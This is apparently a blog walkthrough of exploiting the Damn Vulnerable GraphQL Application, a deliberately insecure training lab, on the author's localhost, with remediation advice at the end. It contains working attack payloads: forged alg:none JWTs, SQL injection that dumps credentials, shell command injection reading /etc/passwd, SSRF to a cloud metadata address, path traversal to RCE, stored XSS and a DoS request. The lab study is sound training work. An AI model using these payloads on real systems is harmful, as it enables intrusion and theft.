---
title: "Damn Vulnerable GraphQL Application (DVGA) — Exploitation Walkthrough"
date: 2026-09-22 08:50:00 +0000
categories: [Damn Vulnerable Applications]
tags: [DVGA, GraphQL, RCE, JWT, SQL Injection, Docker]
description: "A full exploitation study of DVGA v2.2.0: introspection, IDOR, JWT bypass, SQLi, command injection, SSRF, path traversal to RCE, XSS and DoS — including hard-mode bypasses."
author: Paschal Sangawe
toc: true
---

**Damn Vulnerable GraphQL Application (DVGA)** is a deliberately insecure GraphQL app by Dolev Farhi, built to teach GraphQL attack techniques in a safe, local environment. It ships with two difficulty modes — `easy` (Beginner) and `hard` (Expert) — and a set of resolvers that are vulnerable on purpose.

This post is my complete exploitation study of **DVGA v2.2.0**, running locally in Docker. It covers the bug, why it exists, a reproduction, and the hard-mode bypass for each finding.

> **Authorisation:** DVGA is intentionally vulnerable. Everything below was run against my own `localhost` instance.

{% raw %}

## Setup

```bash
docker run -d --name dvga -p 5013:5013 dolevf/dvga
# or, if the image is already present:
docker start dvga
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:5013/   # 200
```

- GraphQL endpoint: `POST http://localhost:5013/graphql`
- GraphiQL: `GET /graphiql` · WebSocket: `ws://localhost:5013/subscriptions`
- Difficulty: `GET /difficulty/easy|hard` or header `X-DVGA-MODE: Expert|Beginner`

Seed credentials: `admin:changeme`, `operator:password123`. JWT secret is hardcoded to `dvga`.

Handy helper:

```bash
gql() { curl -s -X POST -H 'Content-Type: application/json' -d "$1" http://localhost:5013/graphql; }
```

## Finding matrix

| # | Vulnerability | Class | Impact |
|---|---------------|-------|--------|
| 1 | Introspection enabled (`__type` bypass in hard mode) | Info disclosure | Full schema |
| 2 | JWT decoded with `verify_signature:False` (`alg:none`) | AuthN bypass | Impersonate admin |
| 3 | Hardcoded JWT secret `dvga` | AuthN bypass | Forge signed tokens |
| 4 | IDOR: read/edit/delete any paste | Access control | Data theft/integrity |
| 5 | `deleteAllPastes` unauthenticated | Access control | Availability |
| 6 | SQL injection in `pastes(filter:)` | Injection | Dump `users` |
| 7 | RCE via `systemDebug(arg)` | RCE | Command execution |
| 8 | RCE via `systemDiagnostics(cmd)` | RCE | Command execution |
| 9 | RCE/SSRF via `importPaste` | RCE/SSRF | Command exec + SSRF |
| 10 | Path traversal in `uploadPaste` → RCE | RCE | Overwrite `setup.py` |
| 11 | Stored XSS via paste title/content | XSS | Session/JS exec |
| 12 | Audit log leaks all queries | Info disclosure | Secrets/IDs |
| 13 | Blocking `curl` deadlock | DoS | Service down |
| 14 | Unauthenticated subscription stream | Access control | Live private pastes |

## 1. Introspection — dump the whole schema
> **Picture goes here (#1).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `{ __schema { queryType { fields { name } } mutationType { fields { name } } } }`.
> _Save as_ `images/dvga-walkthrough/1.png` _then replace this block with_ `![1. Introspection — dump the whole schema](/images/dvga-walkthrough/1.png)`_._


In easy mode introspection is fully enabled:

```graphql
{ __schema { queryType { fields { name } } mutationType { fields { name } } } }
```

```bash
gql '{"query":"{__schema{types{name kind}}}"}'
```

Feed the JSON to `graphql-voyager`/`InQL`, or walk individual types:

```graphql
{ __type(name:"PasteObject"){ name fields{ name type{ name } } } }
```

**Hard mode:** `IntrospectionMiddleware` only rejects the literal `__schema` field — `__type` is not blocked:

```bash
curl -s -H 'Content-Type: application/json' -H 'X-DVGA-MODE: Expert' \
  -d '{"query":"{__type(name:\"Query\"){name fields{name}}}"}' \
  http://localhost:5013/graphql
```

**Lesson:** blocklisting one field is not introspection protection. Disable the introspection mechanism (`__schema`, `__type`, field suggestions) entirely.

> **Picture goes here (#2).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvga-walkthrough/2.png` _then replace this block with_ `![1. Introspection — dump the whole schema](/images/dvga-walkthrough/2.png)`_._

## 2. Broken access control — read everyone's private pastes
> **Picture goes here (#3).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `gql '{"query":"{pastes(public:false,limit:5){id title content owner{name}}}"}'`.
> _Save as_ `images/dvga-walkthrough/3.png` _then replace this block with_ `![2. Broken access control — read everyone's private pastes](/images/dvga-walkthrough/3.png)`_._


`resolve_pastes` filters on the `public` flag, not on the caller, and requires no auth:

```bash
gql '{"query":"{pastes(public:false,limit:5){id title content owner{name}}}"}'
```

Sibling flaws: `paste(id:)` reads any paste, `editPaste`/`deletePaste` modify/remove any paste, `readAndBurn` reads+deletes, and `deleteAllPastes` wipes the table unauthenticated.

**Lesson:** every resolver needs authentication and an ownership predicate (`filter_by(id=id, owner_id=current_user)`).

> **Picture goes here (#4).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvga-walkthrough/4.png` _then replace this block with_ `![2. Broken access control — read everyone's private pastes](/images/dvga-walkthrough/4.png)`_._

## 3. Authentication bypass — forged JWT (`alg:none`)
> **Picture goes here (#5).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `import json, base64, urllib.request`.
> _Save as_ `images/dvga-walkthrough/5.png` _then replace this block with_ `![3. Authentication bypass — forged JWT (alg:none)](/images/dvga-walkthrough/5.png)`_._


`get_identity()` decodes the token with verification disabled, then `resolve_me` copies the identity into the context, and `resolve_password` returns the real password when the context identity is `admin`.

```python
import json, base64, urllib.request
b64 = lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=').decode()
tok = b64({"alg":"none","typ":"JWT"}) + "." + b64({"identity":"admin"}) + "."
q = '{ me(token:"%s"){id username password} users{id username password} }' % tok
print(urllib.request.urlopen(urllib.request.Request(
    "http://localhost:5013/graphql",
    data=json.dumps({"query": q}).encode(),
    headers={"Content-Type":"application/json"})).read().decode())
```

Result: the admin password (`changeme`) in plaintext. With the hardcoded secret `dvga` you can also mint validly-signed HS256 tokens — but `alg:none` is simpler.

> **Picture goes here (#6).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvga-walkthrough/6.png` _then replace this block with_ `![3. Authentication bypass — forged JWT (alg:none)](/images/dvga-walkthrough/6.png)`_._

## 4. SQL injection — `pastes(filter:)`
> **Picture goes here (#7).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `gql "{\"query\":\"{pastes(public:true,filter:\\\"' UNION SELECT id,username,password,1,1,1`.
> _Save as_ `images/dvga-walkthrough/7.png` _then replace this block with_ `![4. SQL injection — pastes(filter:)](/images/dvga-walkthrough/7.png)`_._


The filter is interpolated into raw SQL with Python `%` formatting. The `pastes` table has 8 columns, so match the count to `UNION` the `users` table:

```bash
gql "{\"query\":\"{pastes(public:true,filter:\\\"' UNION SELECT id,username,password,1,1,1,1,1 FROM users--\\\"){id title content}}\"}"
```

Boolean variant `' OR 1=1--` returns all rows. This is a textbook SQLi → credential dump.

> **Picture goes here (#8).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvga-walkthrough/8.png` _then replace this block with_ `![4. SQL injection — pastes(filter:)](/images/dvga-walkthrough/8.png)`_._

## 5. OS command injection — `systemDebug` and `systemDiagnostics`
> **Picture goes here (#9).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `gql '{"query":"{systemDebug(arg:\"-ef; id; uname -a\")}"}'`.
> _Save as_ `images/dvga-walkthrough/9.png` _then replace this block with_ `![5. OS command injection — systemDebug and systemDiagnostics](/images/dvga-walkthrough/9.png)`_._


`systemDebug` concatenates its argument into `ps {arg}` and runs it via `os.popen`:

```bash
gql '{"query":"{systemDebug(arg:\"-ef; id; uname -a\")}"}'
```

This is **unauthenticated RCE** and is not gated even in hard mode. `systemDiagnostics` requires the (leaked) admin password, then runs the supplied `cmd`:

```bash
gql '{"query":"{systemDiagnostics(username:\"admin\",password:\"changeme\",cmd:\"id; cat /etc/passwd\")}"}'
```

**Hard-mode bypass:** the allowlist only checks `cmd.startswith(('echo', 'ps', 'whoami', 'tail'))`, so command substitution slips through:

```bash
curl -s -H 'Content-Type: application/json' -H 'X-DVGA-MODE: Expert' \
  -d '{"query":"{systemDiagnostics(username:\"admin\",password:\"changeme\",cmd:\"echo $(id)\")}"}' \
  http://localhost:5013/graphql
```

> **Picture goes here (#10).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvga-walkthrough/10.png` _then replace this block with_ `![5. OS command injection — systemDebug and systemDiagnostics](/images/dvga-walkthrough/10.png)`_._

## 6. SSRF + command injection — `importPaste`
> **Picture goes here (#11).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `# SSRF to cloud metadata (never target 127.0.0.1:5013 — see DoS below)`.
> _Save as_ `images/dvga-walkthrough/11.png` _then replace this block with_ `![6. SSRF + command injection — importPaste](/images/dvga-walkthrough/11.png)`_._


The URL is assembled and passed to `curl` through a shell:

```bash
# SSRF to cloud metadata (never target 127.0.0.1:5013 — see DoS below)
gql '{"query":"mutation{importPaste(host:\"169.254.169.254\",port:80,path:\"/latest/meta-data/\",scheme:\"http\"){result}}"}'
```

**Hard-mode bypass:** `strip_dangerous_characters` removes only `;` and `&` — pipes and `$()` survive:

```bash
curl -s -H 'Content-Type: application/json' -H 'X-DVGA-MODE: Expert' \
  -d '{"query":"mutation{importPaste(host:\"127.0.0.1\",port:9,path:\"/| id\",scheme:\"http\"){result}}"}' \
  http://localhost:5013/graphql
```

> **Picture goes here (#12).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvga-walkthrough/12.png` _then replace this block with_ `![6. SSRF + command injection — importPaste](/images/dvga-walkthrough/12.png)`_._

## 7. Path traversal → RCE — `uploadPaste`
> **Picture goes here (#13).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `# 1. prove traversal`.
> _Save as_ `images/dvga-walkthrough/13.png` _then replace this block with_ `![7. Path traversal → RCE — uploadPaste](/images/dvga-walkthrough/13.png)`_._


`save_file()` concatenates the filename into `open(WEB_UPLOADDIR + filename, 'w')` with no sanitisation.

```bash
# 1. prove traversal
gql '{"query":"mutation{uploadPaste(filename:\"../pwned_marker.txt\",content:\"traversal-works\"){result}}"}'

# 2. overwrite setup.py (run by GET /start_over) and trigger it
gql '{"query":"mutation{uploadPaste(filename:\"../setup.py\",content:\"import os; os.system(\\\"id > /tmp/pwned\\\")\"){result}}"}'
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:5013/start_over
```

A complete unauthenticated **file-write → RCE** chain.

> **Picture goes here (#14).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvga-walkthrough/14.png` _then replace this block with_ `![7. Path traversal → RCE — uploadPaste](/images/dvga-walkthrough/14.png)`_._

## 8. Stored XSS
> **Picture goes here (#15).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `gql '{"query":"mutation{createPaste(title:\"xss\",content:\"<img src=x onerror=alert(docum`.
> _Save as_ `images/dvga-walkthrough/15.png` _then replace this block with_ `![8. Stored XSS](/images/dvga-walkthrough/15.png)`_._


The public-pastes page builds HTML with a template literal and passes it to jQuery's `$(htmlString)`, which parses and executes embedded handlers:

```bash
gql '{"query":"mutation{createPaste(title:\"xss\",content:\"<img src=x onerror=alert(document.domain)>\",public:true){paste{id}}}"}'
```

Any user viewing Public Pastes executes the payload in the site origin.

> **Picture goes here (#16).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvga-walkthrough/16.png` _then replace this block with_ `![8. Stored XSS](/images/dvga-walkthrough/16.png)`_._

## 9. Audit log / info disclosure
> **Picture goes here (#17).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `gql '{"query":"{audits{id gqloperation gqlquery}}"}'`.
> _Save as_ `images/dvga-walkthrough/17.png` _then replace this block with_ `![9. Audit log / info disclosure](/images/dvga-walkthrough/17.png)`_._


`resolve_audits` returns **all** audit rows unauthenticated, including raw query text — and `clean_query()` only masks double-quoted `password:"..."`/`token:"..."`, so variables, single quotes and other argument names leak.

```bash
gql '{"query":"{audits{id gqloperation gqlquery}}"}'
```

> **Picture goes here (#18).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvga-walkthrough/18.png` _then replace this block with_ `![9. Audit log / info disclosure](/images/dvga-walkthrough/18.png)`_._

## 10. Hard-mode middleware bypasses
> **Picture goes here (#19).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `# brute force several admin passwords in one request`.
> _Save as_ `images/dvga-walkthrough/19.png` _then replace this block with_ `![10. Hard-mode middleware bypasses](/images/dvga-walkthrough/19.png)`_._


- **`__type`** recovers the schema despite the `__schema` block.
- **Depth/cost protection** uses a naive whitespace tokenizer, so removing whitespace around braces evades it: `query getPastes{pastes{owner{paste{...}}}}`.
- **Op-name allowlist** rejects named operations not on the list, but unnamed operations are always allowed: `{ systemDebug(arg:"-ef") }`.
- **Query denylist** normalises by stripping whitespace and compares exact strings; `{ systemHealth }` or an alias/batch bypasses it.
- **Batching** (`batch=True`) lets a JSON array of operations run in one request — perfect for brute force, since nothing is rate-limited.

```python
# brute force several admin passwords in one request
ops = [{"query":'mutation{login(username:"admin",password:"%s"){accessToken}}' % p}
       for p in ["admin","123456","changeme","password"]]
```

> **Picture goes here (#20).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvga-walkthrough/20.png` _then replace this block with_ `![10. Hard-mode middleware bypasses](/images/dvga-walkthrough/20.png)`_._

## 11. DoS
> **Picture goes here (#21).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `gql '{"query":"mutation{importPaste(host:\"127.0.0.1\",port:5013,path:\"/\",scheme:\"http\`.
> _Save as_ `images/dvga-walkthrough/21.png` _then replace this block with_ `![11. DoS](/images/dvga-walkthrough/21.png)`_._


`helpers.run_cmd` is blocking `os.popen` on a single gevent worker. An `importPaste` to an unreachable host — or to the server itself — blocks the worker indefinitely:

```bash
gql '{"query":"mutation{importPaste(host:\"127.0.0.1\",port:5013,path:\"/\",scheme:\"http\"){result}}"}'
```

One unauthenticated request takes the service offline.

## Root causes

1. No authn/authz in resolvers — authentication is optional and never ownership-checked.
2. Trusting client-supplied identity — JWT decoded with `verify_signature:False`; secret hardcoded.
3. String-built SQL and shell commands (`text("... '%s'" % filter)`, `os.popen(f"curl ...")`).
4. Unsanitised file paths (`open(uploaddir + filename, 'w')`).
5. Unsafe client DOM (`$(htmlString)`).
6. Naive input filters (blocklists, `startswith`, whitespace tokenizers).
7. No rate limiting, batching enabled, blocking calls.
8. Over-fetching schema (password field exposed, introspection on, audit log readable).

## Remediation

- Require auth on all resolvers and enforce object-level ownership.
- Verify JWT signatures with a strong, random, env-provided secret; reject `alg:none`; validate `exp`.
- Parameterise SQL; never `%`-format values.
- Never pass user input to a shell — use `execFile`/`spawn` with argv, or a proper HTTP client with host/scheme allowlists.
- Confine upload paths to the upload root; never auto-execute uploaded files.
- Output-encode content; avoid `$(htmlString)`.
- Disable introspection properly; remove the `password` field; redact audit logs.
- Add rate limiting, cap/disable batching, use non-blocking calls with timeouts, enforce AST-based depth/complexity limits.
- Hash passwords (bcrypt/argon2) and never return them.

## Quick reference

```bash
gql '{"query":"{__schema{types{name}}}"}'
gql '{"query":"{pastes(public:false){id title content}}"}'
gql '{"query":"{systemDebug(arg:\"-ef; id\")}"}'
gql "{\"query\":\"{pastes(public:true,filter:\\\"' UNION SELECT id,username,password,1,1,1,1,1 FROM users--\\\"){title content}}\"}"
gql '{"query":"mutation{uploadPaste(filename:\"../pwned.txt\",content:\"hi\"){result}}"}'
gql '{"query":"{audits{id gqloperation gqlquery}}"}'
```

## Related posts

- [Damn Vulnerable Web Application (DVWA)](/posts/dvwa-walkthrough/)
- [OWASP crAPI](/posts/crapi-walkthrough/)
- [PortSwigger GraphQL labs](/posts/portswigger-graphql-labs/)
- [PortSwigger JWT labs](/posts/portswigger-jwt-labs/)

{% endraw %}

> **Picture goes here (#22).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvga-walkthrough/22.png` _then replace this block with_ `![Related posts](/images/dvga-walkthrough/22.png)`_._
